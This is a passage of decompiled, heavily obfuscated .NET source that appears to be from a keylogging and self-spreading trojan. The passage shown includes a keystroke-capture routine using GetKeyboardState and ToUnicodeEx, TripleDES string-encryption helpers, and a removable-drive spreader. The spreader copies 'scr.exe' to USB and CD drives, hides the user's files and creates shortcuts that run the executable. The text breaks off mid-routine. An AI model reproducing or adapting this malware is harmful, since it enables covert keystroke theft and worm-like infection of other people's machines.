			IL_B2B:
			afg.cdv += <Module>.smethod_0(578960);
			return;
			IL_B49:
			afg.cdv += <Module>.smethod_0(577760);
			return;
			IL_B67:
			afg.cdv += <Module>.smethod_0(577472);
			return;
			IL_B8F:
			afg.cdv += <Module>.smethod_0(579600);
			return;
			IL_BAD:
			afg.cdv += <Module>.smethod_0(577920);
			return;
			IL_BCB:
			afg.cdv += <Module>.smethod_0(578368);
			return;
			IL_BE9:
			afg.cdv += <Module>.smethod_0(577136);
			return;
			IL_C07:
			afg.cdv += <Module>.smethod_0(577376);
			return;
			IL_C25:
			afg.cdv += <Module>.smethod_0(578176);
			return;
			IL_C48:
			afg.cdv += <Module>.smethod_0(579792);
			return;
			IL_C66:
			afg.cgj = bqz.ToString();
			return;
			IL_C7B:
			afg.cdv += <Module>.smethod_0(578560);
			return;
			IL_CA8:
			afg.cdv += <Module>.smethod_0(576256);
			IL_CC6:
			return;
			IL_CD0:
			afg.cdv += <Module>.smethod_0(576208);
			return;
			IL_CF3:
			afg.cdv += <Module>.smethod_0(577872);
			return;
			IL_D11:
			afg.cdv += <Module>.smethod_0(576096);
			afg.cdv += bqz.ToString();
			afg.cgj = null;
			return;
			IL_D4F:
			afg.cdv += <Module>.smethod_0(579680);
			return;
			IL_D6D:
			afg.cdv += <Module>.smethod_0(576928);
			return;
			IL_D8B:
			afg.cdv += <Module>.smethod_0(578752);
			return;
			IL_DAE:
			afg.cdv += <Module>.smethod_0(578208);
			return;
			IL_DCC:
			afg.cdv += <Module>.smethod_0(578800);
			return;
			IL_DE7:
			afg.cdv += <Module>.smethod_0(576288);
			return;
			IL_E06:
			afg.cdv += <Module>.smethod_0(577520);
			return;
			IL_E21:
			afg.cdv += <Module>.smethod_0(578416);
			return;
			IL_548:
			num2 = 2258024623u;
			goto IL_91F;
			IL_AFE:
			afg.bvx();
			num2 = 2688587879u;
			goto IL_91F;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600008E RID: 142 RVA: 0x00020EA0 File Offset: 0x0001F0A0
	private static string cdg(uint cdh)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (;;)
			{
				IL_A9:
				uint num = 802208596u;
				for (;;)
				{
					uint num2;
					IntPtr foregroundWindow;
					switch ((num2 = (num ^ 2064758285u)) % 6u)
					{
					case 0u:
						goto IL_6D;
					case 1u:
					{
						byte[] array = new byte[255];
						if (!afg.GetKeyboardState(array))
						{
							num = (num2 * 2885854906u ^ 2233924646u);
							continue;
						}
						goto IL_6D;
					}
					case 2u:
						goto IL_A9;
					case 3u:
						goto IL_B0;
					case 4u:
					{
						int num3 = 0;
						int windowThreadProcessId = afg.GetWindowThreadProcessId(foregroundWindow, ref num3);
						IntPtr brz = (IntPtr)afg.GetKeyboardLayout(windowThreadProcessId);
						byte[] array;
						afg.ToUnicodeEx(cdh, cdh, array, stringBuilder, 16, 0u, brz);
						num = (num2 * 3863406320u ^ 4117267214u);
						continue;
					}
					}
					goto Block_3;
					IL_6D:
					foregroundWindow = afg.GetForegroundWindow();
					num = 1765150779u;
				}
			}
			Block_3:
			goto IL_B8;
			IL_B0:
			return "";
			IL_B8:
			return stringBuilder.ToString();
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_106:
				uint num4 = 1817547710u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num4 ^ 2064758285u)) % 3u)
					{
					case 0u:
						goto IL_106;
					case 1u:
						num4 = (num2 * 1703403123u ^ 498329755u);
						continue;
					}
					goto Block_5;
				}
			}
			Block_5:;
		}
		return (checked((Keys)cdh)).ToString();
	}

	// Token: 0x04000337 RID: 823
	private static afg.ho cdt = default(afg.ho);

	// Token: 0x04000338 RID: 824
	private static bool cdu;

	// Token: 0x04000339 RID: 825
	private static string cdv;

	// Token: 0x0400033A RID: 826
	private static bool cdy;

	// Token: 0x0400033B RID: 827
	private static bool cdx;

	// Token: 0x0400033C RID: 828
	private static bool cdw;

	// Token: 0x0400033D RID: 829
	private static string cdq;

	// Token: 0x0400033E RID: 830
	private static string cdz;

	// Token: 0x0400033F RID: 831
	private static bool cef;

	// Token: 0x04000340 RID: 832
	private static string ceg;

	// Token: 0x04000341 RID: 833
	private static bool ceh;

	// Token: 0x04000342 RID: 834
	private static bool cej;

	// Token: 0x04000343 RID: 835
	private static bool cek;

	// Token: 0x04000344 RID: 836
	private static bool cel;

	// Token: 0x04000345 RID: 837
	private static bool cem;

	// Token: 0x04000346 RID: 838
	private static bool cen;

	// Token: 0x04000347 RID: 839
	private static bool ceo;

	// Token: 0x04000348 RID: 840
	private static bool cep;

	// Token: 0x04000349 RID: 841
	private static bool cer;

	// Token: 0x0400034A RID: 842
	private static bool ces;

	// Token: 0x0400034B RID: 843
	private static string cet;

	// Token: 0x0400034C RID: 844
	private static bool ceu;

	// Token: 0x0400034D RID: 845
	private static bool cev;

	// Token: 0x0400034E RID: 846
	private static bool cey;

	// Token: 0x0400034F RID: 847
	private static bool cex;

	// Token: 0x04000350 RID: 848
	private static string cew;

	// Token: 0x04000351 RID: 849
	private static bool ceq;

	// Token: 0x04000352 RID: 850
	private static bool cez;

	// Token: 0x04000353 RID: 851
	private static string cfg;

	// Token: 0x04000354 RID: 852
	private static string cfh;

	// Token: 0x04000355 RID: 853
	private static string cfj;

	// Token: 0x04000356 RID: 854
	private static string cfk;

	// Token: 0x04000357 RID: 855
	public static int FrameworkVersion;

	// Token: 0x04000358 RID: 856
	private static Random cfl;

	// Token: 0x04000359 RID: 857
	private static RegistryKey cfm;

	// Token: 0x0400035A RID: 858
	private static object cfn;

	// Token: 0x0400035B RID: 859
	private static string cfo;

	// Token: 0x0400035C RID: 860
	private static Mutex cfp;

	// Token: 0x0400035D RID: 861
	private static string cfr;

	// Token: 0x0400035E RID: 862
	[AccessedThroughProperty("MH")]
	private static afg.ux cfs;

	// Token: 0x0400035F RID: 863
	[AccessedThroughProperty("CH")]
	private static afg.acm cft;

	// Token: 0x04000360 RID: 864
	[AccessedThroughProperty("kbHook")]
	private static afg.adm cfu;

	// Token: 0x04000361 RID: 865
	private static string cfv;

	// Token: 0x04000362 RID: 866
	private static IntPtr cfy;

	// Token: 0x04000363 RID: 867
	private static int cfx;

	// Token: 0x04000364 RID: 868
	private static int cfw;

	// Token: 0x04000365 RID: 869
	private static bool cfq;

	// Token: 0x04000366 RID: 870
	private static string[] cfz;

	// Token: 0x04000367 RID: 871
	private static string cgh;

	// Token: 0x04000368 RID: 872
	private static string cgj;

	// Token: 0x04000369 RID: 873
	private static string cgk;

	// Token: 0x02000011 RID: 17
	public struct ho
	{
		// Token: 0x0400036A RID: 874
		[MarshalAs(UnmanagedType.U4)]
		public int cbSize;

		// Token: 0x0400036B RID: 875
		[MarshalAs(UnmanagedType.U4)]
		public int dwTime;
	}

	// Token: 0x02000012 RID: 18
	public enum hp
	{
		// Token: 0x0400036D RID: 877
		OperatingSystemName,
		// Token: 0x0400036E RID: 878
		ProcessorName,
		// Token: 0x0400036F RID: 879
		AmountOfMemory,
		// Token: 0x04000370 RID: 880
		VideocardName,
		// Token: 0x04000371 RID: 881
		VideocardMem
	}

	// Token: 0x02000013 RID: 19
	public class hr
	{
		// Token: 0x0600008F RID: 143 RVA: 0x00020FDC File Offset: 0x0001F1DC
		public hr(string Password = "password")
		{
			this.no = Password;
		}

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000090 RID: 144 RVA: 0x00020FF8 File Offset: 0x0001F1F8
		public string mz
		{
			get
			{
				UTF8Encoding utf8Encoding = new UTF8Encoding();
				return utf8Encoding.GetString(this.mw);
			}
		}

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000091 RID: 145 RVA: 0x00021018 File Offset: 0x0001F218
		// (set) Token: 0x06000092 RID: 146 RVA: 0x00021034 File Offset: 0x0001F234
		public string no
		{
			get
			{
				new UTF8Encoding();
				return this.mq;
			}
			set
			{
				UTF8Encoding utf8Encoding = new UTF8Encoding();
				for (;;)
				{
					IL_5C:
					uint num = 505699632u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 994895964u)) % 3u)
						{
						case 0u:
							goto IL_5C;
						case 1u:
						{
							MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
							this.mw = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(value));
							this.mq = value;
							num = (num2 * 576097005u ^ 116799491u);
							continue;
						}
						}
						return;
					}
				}
			}
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000210A4 File Offset: 0x0001F2A4
		public string hs(string ht)
		{
			byte[] inArray = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = this.mw;
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider;
				for (;;)
				{
					IL_82:
					uint num = 338936334u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 2028026872u)) % 4u)
						{
						case 0u:
							goto IL_82;
						case 1u:
							tripleDESCryptoServiceProvider.Key = key;
							tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
							tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
							num = (num2 * 3907267593u ^ 3329996026u);
							continue;
						case 2u:
							tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
							num = (num2 * 1972633736u ^ 2926246849u);
							continue;
						}
						goto Block_3;
					}
				}
				Block_3:
				byte[] bytes = utf8Encoding.GetBytes(ht);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
					inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_F9:
						uint num3 = 98000626u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num3 ^ 2028026872u)) % 3u)
							{
							case 0u:
								goto IL_F9;
							case 2u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num3 = (num2 * 1812469233u ^ 3253659913u);
								continue;
							}
							goto Block_9;
						}
					}
					Block_9:;
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x000211D4 File Offset: 0x0001F3D4
		private string jl(string jm, byte[] jn)
		{
			byte[] inArray = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(utf8Encoding.GetString(jn)));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				for (;;)
				{
					IL_8F:
					uint num = 1381392999u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 210679012u)) % 4u)
						{
						case 0u:
							goto IL_8F;
						case 1u:
							tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
							num = (num2 * 518313864u ^ 1561347846u);
							continue;
						case 3u:
							tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
							num = (num2 * 710475758u ^ 2089427135u);
							continue;
						}
						goto Block_3;
					}
				}
				Block_3:
				byte[] bytes = utf8Encoding.GetBytes(jm);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
					inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_106:
						uint num3 = 1350519029u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num3 ^ 210679012u)) % 3u)
							{
							case 0u:
								goto IL_106;
							case 2u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num3 = (num2 * 2276666591u ^ 2512099480u);
								continue;
							}
							goto Block_9;
						}
					}
					Block_9:;
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00021314 File Offset: 0x0001F514
		public string jx(string jw, string jq)
		{
			byte[] inArray = null;
			UTF8Encoding utf8Encoding;
			for (;;)
			{
				IL_3E:
				uint num = 3008399912u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2805012068u)) % 3u)
					{
					case 0u:
						goto IL_3E;
					case 1u:
						utf8Encoding = new UTF8Encoding();
						num = (num2 * 2606394610u ^ 3964867643u);
						continue;
					}
					goto Block_1;
				}
			}
			Block_1:
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(jq));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				for (;;)
				{
					IL_A8:
					uint num3 = 3200876453u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num3 ^ 2805012068u)) % 3u)
						{
						case 1u:
							tripleDESCryptoServiceProvider.Key = key;
							tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
							num3 = (num2 * 2256089082u ^ 783956458u);
							continue;
						case 2u:
							goto IL_A8;
						}
						goto Block_4;
					}
				}
				Block_4:
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] bytes = utf8Encoding.GetBytes(jw);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
					inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_127:
						uint num4 = 2210048241u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num4 ^ 2805012068u)) % 3u)
							{
							case 1u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num4 = (num2 * 1735485317u ^ 3875237177u);
								continue;
							case 2u:
								goto IL_127;
							}
							goto Block_10;
						}
					}
					Block_10:;
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00021474 File Offset: 0x0001F674
		public string kt(string ku)
		{
			byte[] bytes = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = this.mw;
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] array = Convert.FromBase64String(ku);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_A5:
						uint num = 3587104763u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num ^ 3231843833u)) % 3u)
							{
							case 0u:
								goto IL_A5;
							case 1u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num = (num2 * 1313974754u ^ 2207929217u);
								continue;
							}
							goto Block_8;
						}
					}
					Block_8:;
				}
			}
			return utf8Encoding.GetString(bytes);
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00021554 File Offset: 0x0001F754
		public string lo(string lp, byte[] lr)
		{
			byte[] bytes = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(utf8Encoding.GetString(lr)));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider;
				for (;;)
				{
					IL_9D:
					uint num = 3258312882u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 3467819678u)) % 5u)
						{
						case 0u:
							tripleDESCryptoServiceProvider.Key = key;
							num = (num2 * 776455327u ^ 2588006282u);
							continue;
						case 1u:
							tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
							num = (num2 * 2705725345u ^ 2502694477u);
							continue;
						case 3u:
							tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
							num = (num2 * 2120025693u ^ 3038241608u);
							continue;
						case 4u:
							goto IL_9D;
						}
						goto Block_3;
					}
				}
				Block_3:
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] array = Convert.FromBase64String(lp);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_11B:
						uint num3 = 2705311007u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num3 ^ 3467819678u)) % 3u)
							{
							case 0u:
								goto IL_11B;
							case 1u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num3 = (num2 * 4048968221u ^ 1462369918u);
								continue;
							}
							goto Block_9;
						}
					}
					Block_9:;
				}
			}
			return utf8Encoding.GetString(bytes);
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000216A8 File Offset: 0x0001F8A8
		public string lz(string mn, string mo)
		{
			byte[] bytes = null;
			UTF8Encoding utf8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes(mo));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] array = Convert.FromBase64String(mn);
				try
				{
					ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
					bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
			}
			finally
			{
				if (md5CryptoServiceProvider != null)
				{
					for (;;)
					{
						IL_AC:
						uint num = 421391556u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num ^ 1325117338u)) % 3u)
							{
							case 0u:
								goto IL_AC;
							case 1u:
								((IDisposable)md5CryptoServiceProvider).Dispose();
								num = (num2 * 3852244256u ^ 463939070u);
								continue;
							}
							goto Block_8;
						}
					}
					Block_8:;
				}
			}
			return utf8Encoding.GetString(bytes);
		}

		// Token: 0x04000372 RID: 882
		private byte[] mw;

		// Token: 0x04000373 RID: 883
		private string mq;
	}

	// Token: 0x02000014 RID: 20
	public class np
	{
		// Token: 0x06000099 RID: 153 RVA: 0x0002178C File Offset: 0x0001F98C
		public np()
		{
			for (;;)
			{
				IL_55:
				uint num = 1899759960u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 102080702u)) % 3u)
					{
					case 0u:
						goto IL_55;
					case 1u:
						this.sx = false;
						this.sw = null;
						this.ExeName = "scr.exe";
						num = (num2 * 225956298u ^ 4166854031u);
						continue;
					}
					return;
				}
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x000217F8 File Offset: 0x0001F9F8
		public void nr()
		{
			if (this.sw == null)
			{
				for (;;)
				{
					IL_62:
					uint num = 771352965u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 740700442u)) % 3u)
						{
						case 0u:
							goto IL_62;
						case 2u:
							this.sw = new Thread(new ThreadStart(this.ov), 1);
							this.sw.Start();
							num = (num2 * 2202363147u ^ 411607406u);
							continue;
						}
						goto Block_2;
					}
				}
				Block_2:;
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00021870 File Offset: 0x0001FA70
		public void ns()
		{
			this.sx = true;
			DriveInfo[] drives;
			int num3;
			for (;;)
			{
				IL_71:
				if (this.sw != null)
				{
					goto IL_5D;
				}
				uint num = 1429993427u;
				for (;;)
				{
					IL_2A:
					uint num2;
					switch ((num2 = (num ^ 814220556u)) % 6u)
					{
					case 1u:
						drives = DriveInfo.GetDrives();
						num3 = 0;
						num = (num2 * 598864144u ^ 1201284598u);
						continue;
					case 2u:
						goto IL_7B;
					case 3u:
						goto IL_5D;
					case 4u:
						goto IL_71;
					case 5u:
						num = 1370516457u;
						continue;
					}
					goto Block_1;
				}
				IL_5D:
				Thread.Sleep(1);
				num = 1682291526u;
				goto IL_2A;
			}
			Block_1:
			goto IL_33D;
			IL_7B:
			int num4;
			if (num3 >= drives.Length)
			{
				num4 = 759239991;
				goto IL_312;
			}
			goto IL_33D;
			IL_30D:
			num4 = 1059467752;
			IL_312:
			switch ((num4 ^ 814220556) % 3)
			{
			case 0:
				goto IL_30D;
			case 1:
				goto IL_7B;
			}
			return;
			IL_33D:
			DriveInfo driveInfo = drives[num3];
			try
			{
				if (driveInfo.IsReady)
				{
					string[] files;
					int num6;
					for (;;)
					{
						IL_197:
						uint num5 = 1905881591u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num5 ^ 814220556u)) % 8u)
							{
							case 0u:
								goto IL_21B;
							case 1u:
								File.Delete(driveInfo.Name + this.ExeName);
								num5 = (num2 * 2547341472u ^ 1008086568u);
								continue;
							case 2u:
								goto IL_197;
							case 3u:
								if (driveInfo.DriveType == DriveType.Removable | driveInfo.DriveType == DriveType.CDRom)
								{
									num5 = (num2 * 1972832788u ^ 1558346006u);
									continue;
								}
								goto IL_2F7;
							case 4u:
								goto IL_C8;
							case 5u:
								File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Normal);
								num5 = (num2 * 411411647u ^ 2692422542u);
								continue;
							case 6u:
								if (File.Exists(driveInfo.Name + this.ExeName))
								{
									num5 = (num2 * 2084366714u ^ 426592597u);
									continue;
								}
								goto IL_C8;
							}
							goto Block_9;
							IL_C8:
							files = Directory.GetFiles(driveInfo.Name);
							num6 = 0;
							num5 = 99710388u;
						}
					}
					string[] directories;
					int num8;
					for (;;)
					{
						IL_24A:
						uint num2;
						uint num7;
						switch ((num2 = (num7 ^ 814220556u)) % 5u)
						{
						case 0u:
							directories = Directory.GetDirectories(driveInfo.Name);
							num8 = 0;
							num7 = (num2 * 3596410112u ^ 2479824147u);
							continue;
						case 2u:
							goto IL_276;
						case 3u:
							goto IL_21B;
						case 4u:
							goto IL_288;
						}
						break;
					}
					goto IL_2EF;
					IL_288:
					int num9;
					if (num8 >= directories.Length)
					{
						num9 = 1654010371;
						goto IL_2C4;
					}
					goto IL_2EF;
					IL_2BF:
					num9 = 6826039;
					IL_2C4:
					switch ((num9 ^ 814220556) % 3)
					{
					case 0:
						goto IL_2BF;
					case 1:
						goto IL_288;
					case 2:
						goto IL_2F7;
					default:
						goto IL_2F7;
					}
					IL_2EF:
					string path = directories[num8];
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						directoryInfo.Attributes = FileAttributes.Normal;
					}
					catch (Exception ex)
					{
					}
					checked
					{
						num8++;
						goto IL_2BF;
						Block_9:
						goto IL_27D;
						IL_21B:
						uint num7;
						if (num6 >= files.Length)
						{
							num7 = 583680956u;
							goto IL_24A;
						}
						goto IL_27D;
						IL_276:
						num7 = 2123082046u;
						goto IL_24A;
						IL_27D:
						string text = files[num6];
						try
						{
							File.SetAttributes(text, FileAttributes.Normal);
							if (text.ToLower().EndsWith(<Module>.smethod_0(556128)))
							{
								for (;;)
								{
									IL_1FC:
									uint num10 = 439578191u;
									for (;;)
									{
										uint num2;
										switch ((num2 = (num10 ^ 814220556u)) % 3u)
										{
										case 0u:
											goto IL_1FC;
										case 1u:
											File.Delete(text);
											num10 = (unchecked(num2 * 2170297195u) ^ 2357918469u);
											continue;
										}
										goto Block_17;
									}
								}
								Block_17:;
							}
						}
						catch (Exception ex2)
						{
						}
						num6++;
						goto IL_276;
					}
				}
				IL_2F7:;
			}
			catch (Exception ex3)
			{
			}
			checked
			{
				num3++;
				goto IL_30D;
			}
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00021C14 File Offset: 0x0001FE14
		public void ov()
		{
			this.sx = false;
			for (;;)
			{
				DriveInfo[] drives;
				int num;
				if (!this.sx)
				{
					for (;;)
					{
						IL_44:
						drives = DriveInfo.GetDrives();
						num = 0;
						int num2 = -2011811262;
						for (;;)
						{
							switch ((num2 ^ -2094954128) % 4)
							{
							case 0:
								num2 = -933438983;
								continue;
							case 1:
								goto IL_44;
							case 2:
								goto IL_6D7;
							}
							goto Block_2;
						}
					}
					Block_2:
					goto IL_717;
				}
				uint num3 = 2174224672u;
				IL_6E4:
				uint num4;
				switch ((num4 = (num3 ^ 2200013168u)) % 5u)
				{
				case 1u:
					IL_6D7:
					if (num >= drives.Length)
					{
						num3 = 3747881937u;
						goto IL_6E4;
					}
					goto IL_717;
				case 2u:
					IL_6BB:
					Thread.Sleep(5000);
					num3 = (num4 * 2691932894u ^ 2612366718u);
					goto IL_6E4;
				case 3u:
					IL_710:
					num3 = 2818169136u;
					goto IL_6E4;
				case 4u:
					continue;
				}
				break;
				IL_717:
				DriveInfo driveInfo = drives[num];
				try
				{
					if (driveInfo.IsReady && ((driveInfo.TotalFreeSpace > 0L & driveInfo.DriveType == DriveType.Removable) | driveInfo.DriveType == DriveType.CDRom))
					{
						try
						{
							if (File.Exists(driveInfo.Name + this.ExeName))
							{
								goto IL_434;
							}
							goto IL_649;
							uint num5;
							int num7;
							string[] files;
							for (;;)
							{
								IL_5E1:
								string text;
								switch ((num4 = (num5 ^ 2200013168u)) % 20u)
								{
								case 0u:
									goto IL_450;
								case 1u:
									goto IL_17F;
								case 2u:
									goto IL_424;
								case 3u:
								{
									int num6 = 0;
									num5 = (num4 * 1819225513u ^ 4212806681u);
									continue;
								}
								case 4u:
								{
									string[] directories = Directory.GetDirectories(driveInfo.Name);
									num5 = (num4 * 1280609946u ^ 2301685699u);
									continue;
								}
								case 5u:
								{
									object instance;
									NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_0(555408), new object[]
									{
										string.Concat(new string[]
										{
											<Module>.smethod_0(555200),
											this.ExeName.Replace(" ", "\" \""),
											<Module>.smethod_0(555248),
											new FileInfo(text).Name.Replace(" ", "\" \""),
											<Module>.smethod_0(555040)
										})
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_0(554960), new object[]
									{
										this.rt(Path.GetExtension(text))
									}, null, null, false, true);
									NewLateBinding.LateCall(instance, null, <Module>.smethod_0(555008), new object[0], null, null, null, true);
									num5 = (num4 * 972582703u ^ 3119090204u);
									continue;
								}
								case 6u:
									File.SetAttributes(driveInfo.Name + this.ExeName, FileAttributes.Normal);
									num5 = (num4 * 2454458124u ^ 3949512451u);
									continue;
								case 7u:
								{
									int num6;
									string[] directories;
									if (num6 >= directories.Length)
									{
										num5 = 2844805631u;
										continue;
									}
									goto IL_450;
								}
								case 8u:
									goto IL_434;
								case 9u:
									if (Operators.CompareString(Path.GetExtension(text).ToLower(), <Module>.smethod_0(556048), false) != 0 & Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + this.ExeName.ToLower(), false) != 0)
									{
										num5 = (num4 * 1419457586u ^ 409281046u);
										continue;
									}
									goto IL_424;
								case 10u:
								{
									string path;
									object instance2 = NewLateBinding.LateGet(Interaction.CreateObject(<Module>.smethod_0(553824), ""), null, <Module>.smethod_0(553744), new object[]
									{
										driveInfo.Name + Path.GetFileNameWithoutExtension(path) + <Module>.smethod_0(553536)
									}, null, null, null);
									NewLateBinding.LateSetComplex(instance2, null, <Module>.smethod_0(553584), new object[]
									{
										<Module>.smethod_0(553376)
									}, null, null, false, true);
									num5 = (num4 * 1211125093u ^ 641875006u);
									continue;
								}
								case 11u:
								{
									object instance = null;
									num5 = (num4 * 886140664u ^ 2637467918u);
									continue;
								}
								case 12u:
									File.SetAttributes(text, FileAttributes.Hidden);
									File.Delete(driveInfo.Name + new FileInfo(text).Name + <Module>.smethod_0(554816));
									num5 = (num4 * 951893762u ^ 3292838114u);
									continue;
								case 13u:
								{
									object instance2 = null;
									checked
									{
										int num6;
										num6++;
									}
									num5 = (num4 * 362668942u ^ 243292505u);
									continue;
								}
								case 14u:
									num5 = (num4 * 1865708432u ^ 529813151u);
									continue;
								case 15u:
									goto IL_649;
								case 16u:
								{
									object instance2;
									NewLateBinding.LateSetComplex(instance2, null, <Module>.smethod_0(554320), new object[]
									{
										""
									}, null, null, false, true);
									string path;
									NewLateBinding.LateSetComplex(instance2, null, <Module>.smethod_0(554368), new object[]
									{
										string.Concat(new string[]
										{
											<Module>.smethod_0(554160),
											this.ExeName.Replace(" ", "\" \""),
											<Module>.smethod_0(554208),
											new DirectoryInfo(path).Name,
											<Module>.smethod_0(554128)
										})
									}, null, null, false, true);
									NewLateBinding.LateSetComplex(instance2, null, <Module>.smethod_0(553920), new object[]
									{
										<Module>.smethod_0(553968)
									}, null, null, false, true);
									NewLateBinding.LateCall(instance2, null, <Module>.smethod_0(552736), new object[0], null, null, null, true);
									num5 = (num4 * 1274833968u ^ 2606543109u);
									continue;
								}
								case 17u:
